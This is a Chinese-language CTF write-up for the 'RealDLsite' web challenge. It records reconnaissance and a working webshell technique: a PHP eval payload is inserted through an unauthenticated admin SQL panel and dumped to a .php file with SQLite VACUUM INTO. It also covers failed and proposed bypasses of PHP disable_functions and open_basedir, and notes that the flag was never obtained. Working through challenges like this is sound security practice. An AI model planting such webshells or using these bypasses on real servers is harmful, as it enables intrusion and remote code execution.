# RealDLsite CTF Writeup

## 题目信息
- **题目名称**: RealDLsite
- **类型**: Web
- **目标**: 获取 StorageBox 中的 flag (`/root/0-0/flag`)

## 侦察发现

### 技术栈
- **Web Server**: Nginx + PHP 8.4.20 FPM
- **编程语言**: PHP 8.4.20
- **数据库**: SQLite3 (3.46.1)
- **框架**: 自研文件下载管理系统
- **SUID 程序**: `/usr/sbin/StorageBox` (root SUID，管理文件存储)
- **前端**: Bootstrap + jQuery

### 安全限制
```
disable_functions:
  exec, system, shell_exec, passthru, popen, proc_open,
  curl_*, fsockopen, stream_socket_*, mail, symlink, link,
  rename, copy, unlink, putenv, ini_set, glob, 等

open_basedir:
  /var/www/html:/tmp:/app/data/local/test

disable_classes:
  PDO, DOM*, SimpleXML*, Reflection*, Directory*,
  SplFile*, stdClass, 等
```

### 攻击面
1. **管理面板** `/manage?p=/`: 空密码认证 → SQL 执行 → 写入 CONFIG 表
2. **SQLite3 VACUUM INTO**: 可将数据库 dump 为 `.php` 文件
3. **StorageBox SUID**: 管理文件存储，需要 APP_SECRET 环境变量
4. **Cron 备份**: 每 5 分钟 root 读取 `/run/secrets/www` 执行 `StorageBox put`

## 利用过程

### Step 1: Webshell 上传（成功）

**利用 SQLite VACUUM INTO 创建 PHP webshell**

1. 访问 `/manage?p=/`，空密码认证通过
2. 向 CONFIG 表 INSERT PHP payload:
   ```sql
   INSERT INTO CONFIG VALUES ('/s', 'php', '<?php @eval(base64_decode($_POST["pass"]));?>')
   ```
3. 执行 VACUUM INTO 将整个 SQLite 文件 dump 为 `.php`:
   ```sql
   VACUUM INTO '/var/www/html/dl/webshell.php'
   ```
4. 通过 `/view?p=/webshell.php` + POST `pass=<base64>` 执行任意 PHP 代码

### Step 2: 命令执行尝试（全部失败）

**FFI 绕过** → ❌ `ffi.enable` 配置限制，运行时无法调用

**pcntl_exec** → ❌ 函数不存在（未安装 pcntl 扩展）

**SQLite3 绕过 open_basedir** → ❌ PHP 8.x 在扩展层就检测了 open_basedir
```
new SQLite3("/etc/passwd") → "open_basedir prohibits opening /etc/passwd"
new SQLite3("/run/secrets/www") → "open_basedir prohibits opening /run/secrets/www"
```

**SQLite3 loadExtension** → ❌ 抛出 Fatal Error

**LD_PRELOAD (putenv + mail)** → ❌ `putenv` 和 `mail` 都被禁用

**其他扩展** → ❌ `imagick`, `iconv`, `zip` 均未加载

## 卡住的原因

### 三层限制互相兜底

| 层 | 限制 | 封锁的路径 |
|---|------|-----------|
| 1 | **disable_functions** | exec/system/popen/pcntl_exec/proc_open/mail/putenv 全部封杀，无命令执行入口 |
| 2 | **open_basedir** | 严格限定文件读取范围，连 SQLite3 的 C 层 open() 都被 PHP 扩展层拦截 |
| 3 | **扩展缺失** | FFI 配置禁用、imagick/iconv/zip 未安装、无第三方扩展可利用 |

**关键瓶颈**：APP_SECRET 存储在 `/run/secrets/www`（超出 open_basedir），即使拿到也需要执行 StorageBox 二进制来读取 flag，但执行通道完全被封死。

## 未完成的攻击路径

1. **`dl()` 不在 disable_functions 中**：如果能编译一个最小 PHP extension .so 写到 /tmp，通过 `dl()` 加载，可绕过 PHP 内部限制直接调用 `system()` 或 `open()`
2. **检查 `imap_open()` 等非常用扩展**：某些扩展存在命令执行的历史漏洞
3. **Apache mod_php**：如果是 FPM + Nginx，`.htaccess` 无意义；但如果有 Apache 接口某处可用则不同

## Flag 状态
- **未获取** ❌
- Flag 位置: `/root/0-0/flag`（StorageBox 内部格式）
- 需要 APP_SECRET + 命令执行能力才能取出